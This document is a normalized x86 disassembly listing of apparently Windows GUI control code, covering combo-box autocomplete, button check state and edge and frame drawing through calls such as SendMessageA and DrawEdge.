call sub_4044f0
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f228
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_438a70
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_4068d4
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f228
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f4ff
lea eax [ ebp - 0xc ]
call sub_403f90
retn
sub_42f504
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42f8bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43e20c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f8c3
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_403fb4
lea eax [ ebp - 0x44 ]
call sub_403f90
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fb4
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_403fb4
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fb4
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_438a40
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403fe4
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403f90
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_42f410
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_42f43c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404250
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40bc38
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_438a40
mov eax [ ebp - 0x38 ]
call sub_404250
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403454
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42e438
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404250
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4044f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404250
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4044f0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_438a40
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42e45c
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_42f410
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42e438
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40bc38
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_404178
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_40429c
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_4044b0
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_404178
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_40429c
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_42e45c
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_4044b0
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_4044b0
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_40429c
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_438a70
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_4068d4
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_438a40
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403fe4
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42f8cc
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_404178
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_40429c
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_42f8cc
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_42f8cc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42fa81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404250
test eax eax
jne r-xdata
mov eax esi
call sub_404450
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_43f228
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_403454
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fa88
lea eax [ ebp - 0x1c ]
call sub_403f90
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_403fb4
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_43f228
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_403fe4
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_404250
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_4044b0
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_40429c
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_438a70
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_438a40
mov eax [ ebp - 0x1c ]
call sub_404250
push eax
mov eax esi
call sub_404250
pop edx
call sub_4068d4
push eax
push 0x0
push 0x142
mov eax ebx
call sub_43f228
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_43f228
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403454
mov eax ebx
mov si 0xffb2
call sub_403454
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_42fab4
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_41d4b8
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_41d358
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_41d374
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_41d014
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41c9b0
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c1e4
xor edx edx
mov eax [ esi + 0x208 ]
call sub_41d4b8
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_42fb8c
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_42fbb8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_43a0c4
mov eax ebx
call sub_438c68
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44f7bc
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_4390e8
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_438c78
sub_42fc30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_42ea24
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41c9e4
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_42fc8c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43d3b8
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb00
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42feb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43761c
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c9b0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d050
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d050
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403258
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4383e0
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_41d438
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c9b0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d050
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d050
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d438
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_42e438
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d438
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d438
push eax
call DrawFrameControl
jmp r-xdata
sub_42fec8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43af20
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_42feec
push ebx
mov ebx eax
mov eax ebx
call sub_445010
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_42ff24
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_42ff7a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_42ff88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43af54
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_42ffdc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43fcf8
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_430030
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_430054
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_43cc3c
mov eax ebx
mov si 0xffb5
call sub_403454
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_43f228
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403454
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_4300cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_429004
mov ebx eax
mov eax ebx
call sub_4290e4
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43f228
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_4291e4
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430118
push ebx
push esi
mov esi edx
mov ebx eax
call sub_429004
call sub_4290e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43d67c
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_430144
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c0b4
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_43017c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42ff88
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_4381fc
mov edx 0x19
mov eax esi
call sub_438220
mov dl 0x1
mov eax esi
call sub_43f45c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_430208
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_43f52c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_43f228
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_43f228
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_43025c
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_43f52c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44f7bc
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_439bf4
sub_430290
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_430144
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43bfe0
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4302f8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_43e6a4
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44f6c4
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403454
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430365
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4303de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_438a40
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44f74c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43e6ac
mov eax ebx
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403454
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4303e5
sub_4303ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_43e6b4
pop edi
pop esi
pop ebx
retn
sub_430440
push ebx
push esi
mov esi edx
mov ebx eax
call sub_429004
call sub_4290e4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_43046c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_429004
mov ebx eax
mov eax ebx
call sub_4290e4
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43f228
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_4291e4
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4304b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42ff88
mov edx 0x71
mov eax esi
call sub_4381fc
mov edx 0x11
mov eax esi
call sub_438220
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_430520
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_430560
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_43bf58
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43bf1c
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_4452a4
sub_43061c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f45c
mov eax [ ebp - 0x4 ]
call sub_43f52c
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call SendMessageA
push ebp
call sub_430560
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43864c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403454
sub_4306a8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_430144
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_43bfe0
mov eax ebx
mov si 0xffc8
call sub_403454
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_4306ff
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x4529173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop ebx
retn
sub_430734
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4307a9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_438a40
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44f74c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43e6ac
mov eax ebx
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
